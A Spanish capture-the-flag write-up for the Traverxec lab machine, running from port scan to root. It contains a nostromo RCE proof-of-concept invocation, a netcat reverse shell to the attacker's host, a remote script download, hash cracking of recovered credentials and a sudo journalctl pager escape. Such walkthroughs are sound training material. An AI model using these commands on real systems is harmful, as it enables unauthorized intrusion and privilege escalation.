---
title: Traverxec WriteUp
author: emilio1625
date: 2020-04-08
---

# Detalles de la máquina

---------- -------------
IP         10.10.10.165
SO         Linux
Dificultad Fácil
---------- -------------

# Enumeración

Comencé de forma sencilla, haciendo un escaneo de puertos de la máquina, este
escaneo revela que está abiertos los puertos 22 y 80 de la computadora. En el
puerto 22 se está ejecutando OpenSSH, y en el puerto 80 se esta ejecutando
`nostromo 1.9.6` y no apache o nginx.

```shell
# nmap -A 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-15 17:02 CDT
Nmap scan report for 10.10.10.165
Host is up (0.32s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.18 seconds
```

No conozco `nostromo` así que busco en Internet este software y en los primeros
resultados de Internet aparece una vulnerabilidad RCE en esta versión de
nostromo. Antes de revisar el código de la PoC seguí buscando la documentación
de nostromo, al parecer nostromo es un servidor web desarrollado en algún
momento de la historia, por alguien pero el sitio del desarrollador esta caído.

# Entrada a la máquina

Lo siguiente que hacemos es ejecutar [el
PoC](https://www.exploit-db.com/exploits/47837) y con algo de suerte obtener una
shell interactiva.

```shell
python cve2019_16278.py 10.10.10.165 80 whoami
www-data
```

Tenemos acceso a la computadora, pero no en una shell interactiva. Al parecer
hay una forma de hacer esto usando metasploit pero no conozco esa herramienta,
Así que el plan ahora es crear una reverse shell interactiva usando netcat y
python.

```shell
$ python cve2019_16278.py 10.10.10.165 80 "nc -e /bin/bash 10.10.14.56 3355"
```

```shell
$ nc -lvnp 3355
listening on [any] 3355 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.10.165] 53542

python3 -c 'import pty; pty.spawn("/bin/bash");'

www-data@traverxec:/usr/bin$
```

Muy bien ahora que tenemos una shell interactiva ejecutaremos un script de
enumeración para saber un poco más sobre el servidor, para esto crearemos un
servidor web que sirva el script de enumeración, el cual vamos a descargar desde
el servidor.

```shell
$ python3 -m http.server 5533
Serving HTTP on 0.0.0.0 port 5533 (http://0.0.0.0:5533/) ...
10.10.10.165 - - [15/Apr/2020 18:40:36] "GET /enum.sh HTTP/1.1" 200 -
^C
```

```shell
$ wget 10.10.14.56:5533/enum.sh
$ bash enum.sh > enum.txt
$ less -r enum.txt
```

De esta forma obtenemos información sobre un usuario regular `david`,
probablemente debemos encontrar una manera de acceder a este usuario.

# Movimiento lateral

Encontramos más adelante en la salida del script de enumeración la siguiente
información.

```
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

No logré encontrar documentación sobre nostromo antes, pero no me parece
descabellado que este archivo .htpasswd use el mismo formato que apache2, así
que probaremos romper el hash usando John the Reaper.

```shell
# john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd
Nowonly4me       (david)
Session completed
```

Ok, tenemos password, ahora debemos encontrar donde ponerlo. En la carpeta
`/var/nostromo/conf` encontramos un archivo de configuración, en su contenido
podemos ver que la carpeta `/home` parece estar accesible de forma remota,
probablemente aquí es donde debemos poner la contraseña. 

```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

En la página del manual de nostromo se indica que el folder `/home/david`
debería estar accesible en `10.10.10.165/~david/` y así es, pero al parecer nada
es accesible desde aquí.

![Captura](screen.png)

De acuerdo a la página del manual de nostromo, el usuario puede restringir el
acceso a una sola carpeta usando la directiva `homedirs_public` y vemos que en
efecto David restringió el acceso a la carpeta `public_www` únicamente. Si
listamos los archivos en la carpeta `/home/david/public_www` encontramos un
archivo interesante.

```shell
$ ls -lAR /home/david/public_www/
/home/david/public_www/:
total 8
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area

/home/david/public_www/protected-file-area:
total 8
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
```

Si accedemos a la url `10.10.10.165/~david/protected-file-area` el sitio nos
pide autenticarnos y por fin podemos usar el password que obtuvimos antes y nos
permite descargar el respaldo de sus llaves ssh. En el respaldo encontramos una
llave privada cifrada, si intentamos reusar la contraseña anterior no funciona.
Si intentamos encontrar el password usando John the Reaper nos llevamos la grata
sorpresa de que lo encuentra en segundos.

```shell
$ /usr/share/john/ssh2john.py id_rsa > david.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt david.hash
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
finding a possible candidate.
hunter           (id_rsa)
Session completed
```

Si intentamos conectarnos usando esta llave y este password vemos que todo
funciona sin problemas

```shell
$ ssh david@10.10.10.165 -i id_rsa
Enter passphrase for key 'id_rsa':
david@traverxec:~$
```

# Escalado de privilegios

Si listamos los archivos en el directorio home de David vemos la bandera
`user.txt` y una carpeta llamada `bin` en ella y ahí encontramos el siguiente
script:

```shell
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

En la última linea vemos que usa `sudo journalctl` quizá podemos usar este
programa sin contraseña, de ser así normalmente `journalctl` usará un paginador
(normalmente less) para mostrar los logs y desde ahí podríamos lanzar una shell
de root, probemoslo.

```shell
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/bash
root@traverxec:/home/david#
```

Ahora podemos ir a `/root` y obtener la bandera del usuario root.

# Aclaraciones

Esta máquina la completé después de la fecha de retiro, cuando ya estaba
disponible el writeup oficial, sin embargo no use el writeup como apoyo. Parte
de este proceso lo realicé con ayuda de
[hectorhmx](https://github.com/hectorhmx/)

